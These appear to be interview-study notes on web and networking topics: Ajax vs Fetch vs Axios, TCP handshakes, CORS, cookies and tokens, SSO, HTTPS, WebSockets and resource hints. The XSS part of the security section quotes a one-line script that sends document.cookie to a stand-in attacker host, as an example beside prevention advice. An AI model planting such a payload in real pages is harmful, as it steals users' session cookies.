## Tell the difference of Ajax, Fetch and Axios

Ajax, Fetch, and Axios are all tools for making HTTP requests in web applications, but they have distinct characteristics and uses.

Overall, Ajax represents a classical approach to asynchronous web requests, while Fetch and Axios are modern techniques, with Axios providing a richer feature set and more user-friendly API than the native Fetch API.

### Ajax (Asynchronous JavaScript and XML)

1. **What it is**: Ajax is a technique that combines several technologies, including HTML, CSS, JavaScript, the DOM, XML, XSLT, and particularly the XMLHttpRequest object. It enables web pages to update asynchronously by exchanging data with the server in the background. This allows for updating specific sections of a webpage without needing to reload the entire page. 

2. **Code Example**:
   ```javascript
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
       if (this.readyState == 4 && this.status == 200) {
          document.getElementById("demo").innerHTML = this.responseText;
       }
   };
   xhttp.open("GET", "ajax_info.txt", true);
   xhttp.send();
   ```

### Fetch API

1. **What it is**: The Fetch API is a modern method for making web requests. It is part of the window object in modern browsers and provides a cleaner, promise-based approach to asynchronous requests, making it a more straightforward alternative to XMLHttpRequest.

2. **Code Example**:
   ```javascript
   fetch('https://api.example.com/data')
     .then(response => response.json())
     .then(data => console.log(data))
     .catch(error => console.error('Error:', error));
   ```

### Axios

1. **What it is**: Axios is a widely-used, promise-based HTTP client that works both in the browser and in node.js. It is a third-party library offering an enhanced and more intuitive API for making HTTP requests. It offers a simple yet extensible interface, capable of making XMLHttpRequests in the browser and HTTP requests in node.js. Axios supports the Promise API, can intercept requests and responses, transform data, cancel requests, and automatically handle JSON data. 

2. **Code Example**:
   ```javascript
   axios.get('https://api.example.com/data')
     .then(response => {
       console.log(response.data);
     })
     .catch(error => {
       console.error('Error:', error);
     });
   ```

## Describe TCP 3-way handshake and 4-way termination
### TCP 3-Way Handshake (Connection Establishment)
1. **SYN**: The client begins the handshake by sending a SYN (synchronize) packet to the server. This packet carries the client's initial sequence number, which is crucial for coordinating the subsequent data transfer.
2. **SYN-ACK**: In response, the server sends back a SYN-ACK (synchronize-acknowledge) packet. This packet acknowledges the client's SYN (hence the ACK) and also contains the server's initial sequence number, setting the stage for two-way communication.
3. **ACK**: The client completes the handshake by sending an ACK (acknowledge) packet to the server. This acknowledges the server's SYN-ACK packet, and with this, the connection is officially established, ready for data transfer.

### TCP 4-Way Termination (Connection Termination)
1. **FIN from Initiator**: The initiator (say, client A) of the termination sends a FIN (finish) packet to the other party (client B), signaling that it has no more data to send.
2. **ACK from Receiver**: Client B acknowledges the FIN from A by sending back an ACK (acknowledge) packet. At this point, A knows that B is aware of its intention to close the connection.
3. **FIN from Receiver**: After sending any remaining data, B sends its own FIN packet to A, indicating its readiness to close the connection.
4. **ACK from Initiator**: A responds with a final ACK packet acknowledging B's FIN. Post this, A can safely close the connection. B, upon receiving this ACK, will also close the connection. This ensures a clean and orderly termination of the connection from both ends.

## Why send options request when using HTTP cross origin?
An OPTIONS request is vital in the CORS process to ensure secure cross-origin communication. It helps browsers determine whether the server's CORS policy permits the actual request, thus enhancing web security by allowing servers to specify who can access their resources and how.

### Understanding the Importance of OPTIONS Requests in Cross-Origin HTTP Communication

1. **Same-Origin Policy**: A fundamental security concept in web development, the same-origin policy restricts how a document or script loaded from one origin can interact with resources from another origin. This policy is implemented by web browsers to prevent potentially malicious scripts on one website from obtaining access to sensitive data on another website. A same origin is defined by matching the protocol, domain, and port of the two resources.

2. **Cross-Origin Resource Sharing (CORS)**: CORS is a mechanism that allows many resources (e.g., fonts, JavaScript, etc.) on a web page to be requested from another domain outside the domain from which the first resource was served. It's a way for servers to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading of resources.

3. **OPTIONS Preflight Request**: In CORS, an OPTIONS preflight request is automatically sent by the browser to determine whether the cross-origin request is safe to send. This preflight checks if the server will accept the actual request, based on its CORS policy. This request includes methods like GET, POST, or custom headers that might be used in the actual request.

4. **Cross-Origin Requests without Preflight**: Not all cross-origin requests need a preflight. Simple requests, like using GET or POST with certain headers, might not trigger this preflight check. However, more complex requests, especially those using methods like PUT or DELETE, or containing custom headers, generally require a preflight check.

### CORS Solutions

**Solution 1: JSONP Approach**
```html
<!-- On the client side -->
<script>
    window.onSuccess = function (data) {
        console.log(data);
    }
</script>
<script src="https://www.example.com/api/getData"></script>
```
In the JSONP (JSON with Padding) approach, a `<script>` tag is used to bypass the same-origin policy. The external script contains a function call with the desired data. While this method can circumvent CORS restrictions, it's limited in functionality and security.

**Solution 2: Server-Side CORS Configuration (Preferred)**
```javascript
// Server-side configuration for CORS
response.setHeader("Access-Control-Allow-Origin", "http://localhost:8011"); // or use '*' for all origins
response.setHeader("Access-Control-Allow-Headers", "X-Requested-With");
response.setHeader("Access-Control-Allow-Methods", "PUT, POST, GET, DELETE, OPTIONS");
response.setHeader("Access-Control-Allow-Credentials", "true"); // Allow cookies
```
This approach involves configuring the server to send appropriate CORS headers, allowing requests from specific origins or methods. It's the preferred method for handling cross-origin requests as it provides better control and security.

## What is Restful API
RESTful APIs are architectural guidelines for designing networked applications. They rely on stateless, client-server communication, where operations are performed using standard HTTP methods. For managing a blog, RESTful APIs provide endpoints for creating (POST), deleting (DELETE), updating (PATCH or PUT), and querying (GET) blog posts. Each operation targets a specific resource, identified by a URL, and uses the appropriate HTTP method to convey the action. For updates, PUT replaces an entire resource, while PATCH modifies parts of it, making PATCH more suitable for updates where only a few fields change. This approach to API design promotes scalability, simplicity, and flexibility.

## What is the difference between a token and a cookie in web requests?

### Cookie
A cookie is a small piece of data sent from a website and stored on the user's computer by the web browser while browsing. Cookies enable websites to remember stateful information (such as items in a shopping cart) or to record browsing activities (like logging in or visiting pages). They are also used to recall information entered into form fields, such as names and addresses.

- Cookies help maintain a user's session by being included in every request to identify the session due to HTTP's stateless nature.
- Servers send a "Set-Cookie" header to the client, with cookies limited to 4KB.
- Cookies are subject to Same-Origin Policy (SOP), preventing them from being shared across different origins.
- Before HTML5, cookies were used for data storage, but LocalStorage and SessionStorage are now preferred.

Modern browsers are limiting or blocking third-party cookies to improve privacy. This is aimed at reducing third-party ads and trackers that invade privacy, separate from the Same-Origin Policy.

**Cookies + Sessions for authentication**
- **Cookies** are used for login authentication, storing identifiers like a user ID.
- **Sessions** are server-side storage of user information linked to cookie identifiers.
- Cookies and sessions together maintain authenticated states across web requests. The process typically involves the client sending credentials, the server updating the session and setting a cookie, and subsequent requests being personalized and secure based on the cookie.

### Token
- Tokens, unlike cookies, are not part of the HTTP standards and can be customized. They need manual storage, such as in LocalStorage.
- Tokens are not automatically managed by browsers and must be manually set and sent in headers, for example, as "Authorization: Bearer <token>".
- Unlike cookies, tokens do not have inherent CORS limitations.
- **JWT (JSON Web Token)** is a common type of token that involves the backend authenticating a login request and returning an encrypted string token, which the client stores and includes in the header of subsequent requests.

### Follow up: Session vs Token, which is better
The choice between session and token-based authentication depends on the specific requirements and constraints of the application.  
For applications prioritizing server control over user sessions, quick user management actions, and where server resources are not a major concern, session-based authentication may be preferred.  
For applications requiring scalability across multiple servers, reduced server load, and flexibility in handling requests from various domains (thus minimizing CORS issues), token-based authentication is often the better choice.  
Both approaches have their merits and drawbacks, and the decision should align with the application's architectural needs, security requirements, and expected user load.  

### Follow up: How to Achieve SSO (Single Sign-On)?

Single Sign-On (SSO) is an authentication process that allows a user to access multiple systems with one set of login credentials. This process involves three parties: the client side, the server side (System A), and a third-party SSO provider. The SSO flow typically follows these steps:

1. **Client Side Accesses System A**: The user tries to access System A.
2. **Authentication Failure**: System A checks for a valid certificate. Finding none, it informs the client that authentication has failed and login is required.
3. **Redirect to SSO Provider**: The client is redirected to the SSO provider because it lacks an SSO certificate.
4. **SSO Login Request**: The SSO provider requests the client to log in.
5. **Client Side Login**: The user logs in to the SSO provider.
6. **SSO Certificate and Token Issuance**: Upon successful login, the SSO provider issues a ticket (token) and an SSO certificate to the client.
7. **Certificate Storage on Client Side**: The client stores the SSO certificate.
8. **System A Validates Certificate**: The client attempts to access System A again, this time presenting the SSO certificate. System A contacts the SSO provider to validate the certificate.
9. **Certificate Validation by SSO Provider**: The SSO provider authenticates the certificate and validates the ticket.
10. **Valid Ticket Acknowledgment**: System A receives a message from the SSO provider that the ticket is valid and proceeds to process the client's request.
11. **Data Returned to Client Side**: System A returns the requested data to the client.

**Key Concepts Related to SSO:**

- **SSO Certificate**: A digital certificate that confirms the user's identity. It's used by the client to prove authentication without logging in again.
- **Token (Ticket)**: A unique piece of data issued by the SSO provider that represents the user's authentication state. It's used for validating the user's session without re-entering credentials.
- **Authentication Flow**: The process by which a user's identity is verified across multiple applications or systems using a single set of credentials managed by the SSO provider.

**Benefits of SSO:**

- **Enhanced User Experience**: Users need to log in only once to access multiple applications, simplifying their interaction with web services.
- **Improved Security**: Centralizes the management of user credentials and authentication processes, reducing the likelihood of password fatigue and the risks associated with managing multiple credentials.
- **Simplified Administration**: Eases the burden of password resets, account lockouts, and other administrative tasks related to user access across multiple systems.

## Difference between HTTP and UDP

HTTP (Hypertext Transfer Protocol) and UDP (User Datagram Protocol) operate at different layers of the network stack, with HTTP functioning at the application layer and UDP at the transport layer.

**HTTP**
- **Layer**: Application
- **Connection**: Connection-oriented
- **Reliability**: HTTP is built on TCP (Transmission Control Protocol), which ensures reliable transmission of data through error checking and retransmission of lost packets.
- **Use Cases**: Web browsing, form submission, data transfer in a reliable and ordered manner.
- **Characteristics**: HTTP requests and responses are structured in a predefined format, allowing for complex web interactions, including state management through cookies, authentication, and caching strategies.

**UDP**
- **Layer**: Transport
- **Connection**: Connectionless
- **Reliability**: Does not guarantee delivery, order, or error checking, making it less reliable but faster compared to TCP.
- **Use Cases**: Streaming media (video, audio), online gaming, voice over IP (VoIP) where speed is crucial and occasional data loss is acceptable.
- **Characteristics**: Suitable for applications that require fast, efficient transmission, such as live broadcasting or multiplayer online games.

**OSI Model Layers**
1. Application Layer
2. Presentation Layer
3. Session Layer
4. Transport Layer (TCP, UDP)
5. Network Layer
6. Data Link Layer
7. Physical Layer

**TCP/IP Model Layers**
1. Application Layer (HTTP, DNS, SMTP)
2. Transport Layer (TCP, UDP)
3. Internet Layer (IP)
4. Network Interface Layer

## Follow-up: Difference between HTTP 1.0, 1.1, and 2.0
**HTTP 1.0**
- **Features**: Basic protocol supporting GET and POST methods.
- **Connection**: Each request opens a new TCP connection, leading to overhead and latency.

**HTTP 1.1**
- **Features**: Introduced more sophisticated caching mechanisms (Cache-Control, ETag), persistent connections (`Connection: keep-alive`) to allow multiple requests over a single connection, range requests, and additional methods like PUT and DELETE for RESTful APIs.
- **Performance**: Reduced latency by reusing connections, introduced chunked transfer encoding for dynamic content.

**HTTP 2.0**
- **Features**: Significantly improved performance through header compression (reducing overhead), multiplexing (allowing multiple requests and responses to be in flight simultaneously over a single TCP connection), and server push capabilities.
- **Adoption**: Increasingly widespread, offering substantial efficiency improvements over HTTP/1.x.

## What is an HTTPS Man-in-the-Middle Attack? How Can It Be Prevented?

A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts the communication between two parties, usually with the intent to secretly listen in or modify the messages being exchanged. In the context of HTTPS, this can be particularly damaging as HTTPS is designed to secure transmissions over the web, making any breach a serious concern.

### Symmetrical Encryption
Symmetrical encryption uses a single key for both encryption and decryption. This method is efficient and less resource-intensive, making it a cost-effective solution for many encryption needs.

### Asymmetrical Encryption
Asymmetrical encryption, on the other hand, involves two keys: a public key for encryption and a private key for decryption. This type of encryption is more secure but also more resource-intensive, leading to higher costs.

### HTTPS Encryption Process
- HTTP transmits data in plain text, making it vulnerable to interception and eavesdropping.
- HTTPS enhances security by encrypting the data transmitted between the client and the server. The encryption process involves:
  1. The client generates a random key and encrypts it with the server's public key, then sends this encrypted key to the server.
  2. The server decrypts the received key using its private key.
  3. Both parties use the random key for symmetric encryption, securing the subsequent communication.

The initial exchange of the random key uses asymmetrical encryption, ensuring that only the server can decrypt the key with its private key. The subsequent communication is secured through symmetrical encryption.

### Man-in-the-Middle Attack
During the asymmetrical encryption step, there's a risk that an attacker could intervene by presenting the client with the attacker's public key instead of the server's. This allows the attacker to decrypt, read, and potentially alter the communication by hijacking the session key.

### Prevention Measures
The primary defense against MitM attacks in the context of HTTPS is the use of certificates. Certificates are digital documents that verify the identity of the parties involved in the communication. They are issued by trusted third-party organizations known as Certificate Authorities (CAs). To prevent MitM attacks, it is crucial to:
- Ensure that the website's certificate is valid and issued by a reputable CA.
- The browser checks that the domain name in the certificate matches the website's domain.
- Use certificates from CAs that have established trust relationships with major browser vendors.

By adhering to these practices, both website owners and users can significantly reduce the risk of falling victim to MitM attacks, ensuring that their communications remain secure and private.

## Front-End Security Threats and Prevention Measures

### XSS (Cross-Site Scripting)
XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.

**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.

**Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.

### CSRF (Cross-Site Request Forgery)
In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.

**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.

**Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.

### Clickjacking
Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.

**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.

**Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.

### DDoS (Distributed Denial of Service)
DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.

**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.

**Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.

### SQL Injection
SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.

**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.

**Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.

### Best Practices for Prevention
Implementing robust security measures on both the front-end and back-end is crucial for protecting web applications against these attacks. This includes validating user inputs, employing security headers, and adhering to secure coding practices. Regular security audits and updates can also significantly reduce vulnerabilities.

## Websocket vs HTTP Protocol

### Websocket Protocol
- **Supports peer-to-peer communication**: Unlike HTTP, which is primarily designed for client-server communication, Websockets enable real-time, bi-directional communication between the client and server.
- **Protocol Name**: The Websocket protocol is indicated by `ws://` or `wss://` for secure Websockets, similar to how `http://` and `https://` indicate HTTP and HTTPS protocols.
- **Initiation**: A Websocket connection can be initiated by either the client or server side. This flexibility is particularly useful for applications that require real-time data exchange.
- **Use Cases**: It is widely used in applications requiring real-time interaction, such as message notifications, live discussion rooms, and collaborative editing platforms.
- **CORS Policy**: Websockets are not subject to the same-origin policy, which restricts how a document or script loaded from one origin can interact with resources from another origin. This means Websockets do not have CORS limitations.
- **Communication**: Communication over a Websocket is achieved through the `send` method for sending messages and the `onmessage` event handler for receiving messages. This contrasts with the request-response model used by HTTP.
- **Security**: A Websocket connection can be upgraded to a secure connection (`wss://`), analogous to upgrading HTTP to HTTPS, to ensure encrypted communication.

**Connection Steps**
1. The process begins with a standard HTTP request.
2. If successful, the connection is upgraded to a Websocket protocol for ongoing communication.

A Discussion Room Code Example:  
```js
// Node.js Side
const { WebSocketServer } = require('ws');
const wsServer = new WebSocketServer({ port: 3000 });
const list = new Set();

wsServer.on('connection', curWs => {
    console.info('Connected');
    list.add(curWs);
    // Implement cleanup mechanism here to remove inactive connections

    curWs.on('message', msg => {
        console.info('Received message:', msg.toString());
        // Broadcast to other clients
        list.forEach(ws => {
            if (ws === curWs) return;
            ws.send(msg.toString());
        });
    });
});
```
*Note: It's important to implement a cleanup mechanism to remove inactive connections to prevent memory leaks.*

```html
<!-- Client Side -->
<script>
    const ws = new WebSocket('ws://127.0.0.1:3000');
    ws.onopen = () => {
        console.info('Opened');
        ws.send('Client opened');
    };
    ws.onmessage = event => {
        console.info('Received message:', event.data);
    };

    const btnSend = document.getElementById('btn-send');
    btnSend.addEventListener('click', () => {
        console.info('Clicked');
        ws.send('Current time: ' + Date.now());
    });
</script>
```

In practice, for ease of use and additional features, developers often use libraries like Socket.IO. Socket.IO abstracts the complexities of Websockets and provides a cleaner API, such as `socket.emit()` for sending messages and `io.on()` for listening to events.

### Follow Up - Difference between WebSocket and HTTP: keep-alive

The main difference between WebSocket and HTTP with the `keep-alive` connection option lies in the nature of the communication and the initiation of requests.

**HTTP: keep-alive**
- **Connection Type**: HTTP is a stateless protocol. By default, each request/response pair is followed by closing the connection. However, with the `keep-alive` option, the connection between the client and server can be kept open, allowing multiple requests to be sent over the same connection without having to re-establish it each time.
- **Client-Initiated**: In an HTTP communication, even with `keep-alive`, the client initiates all requests. The server cannot send data to the client unless the client first sends a request. This means the server must wait for the client to request data before it can send any.
- **Server Response**: With `keep-alive`, the server holds the connection open for a specified time (or until a specified number of requests have been sent), allowing for faster subsequent requests by avoiding the overhead of establishing new connections. However, the server is essentially in a wait state, responding to client requests as they come in without the ability to initiate communication.
- **Timeouts and Retries**: If the server takes too long to respond, the client might face timeouts and may need to retry its request. This mechanism doesn't inherently solve issues related to real-time data exchange or server push capabilities.

**WebSocket**
- **Bi-Directional Communication**: WebSocket provides a full-duplex communication channel that operates over a single, long-lived connection. Once established, this connection allows either the client or the server to initiate messages, breaking away from the request-response model.
- **Server and Client Initiation**: Unlike HTTP, WebSocket allows the server to send data to the client at any time once the WebSocket connection is established. This makes it ideal for real-time applications where the server needs to push updates to the client without waiting for a request.
- **Real-Time Interaction**: WebSocket is designed for applications that require real-time data exchange, such as live chat, gaming, or financial trading applications, where the overhead of establishing new connections for each message (as in HTTP) would be prohibitive.
- **Efficiency and Performance**: WebSocket connections are more efficient for real-time communication because they eliminate the HTTP overhead after the initial handshake. This makes WebSocket a better choice for scenarios where performance and latency are critical.

## Difference between Prefetch and DNS-Prefetch

### `prefetch` and `preload`
- `preload` is a directive used to instruct the browser to load a resource early in the page's lifecycle, because it will be needed soon. This is crucial for resources that are critical to the current page's content, ensuring they are loaded with higher priority. The syntax is `<link rel="preload" href="example.js" as="script">` (or as="style" for CSS files), indicating that the resource is important for the immediate page load.
- `prefetch` is a hint to the browser that a resource might be needed in the future, but not on the current page. Resources prefetched are fetched and stored in the cache with low priority, during idle browser time, making them faster to load on subsequent page visits. The syntax is `<link rel="prefetch" href="example.js" as="script">`, suggesting the resource may be used in subsequent pages or actions.

### `dns-prefetch` and `preconnect`
- `dns-prefetch` is a way to resolve domain names (DNS lookups) before a user clicks on a link. This process reduces latency when the user navigates to the linked resource, as the DNS resolution step is already completed. The syntax for using it is `<link rel="dns-prefetch" href="//example.com">`. It's especially useful for third-party resources or any links that lead to different domains.
- `preconnect` goes a step further than DNS-prefetch by not only resolving the domain name but also performing the TCP handshake and, if the protocol is HTTPS, the TLS negotiation. This fully prepares the browser for a future connection, reducing the connection establishment time. The syntax is `<link rel="preconnect" href="//example.com">`. Preconnect is more comprehensive than DNS-prefetch because it completes all the preliminary network steps, making the resource ready to be used with minimal delay.

**Summary**
- Use **preload** for critical resources needed for the current page to ensure they are loaded quickly and with high priority.
- Use **prefetch** for resources that will be needed in subsequent page visits, to speed up their load time when the user navigates to those pages.
- Use **dns-prefetch** to resolve domain names ahead of time, reducing DNS lookup time for third-party resources or anticipated navigations.
- Use **preconnect** to fully prepare for a future connection, including DNS lookup, TCP handshake, and TLS negotiation, minimizing the latency for high-priority, cross-origin requests.
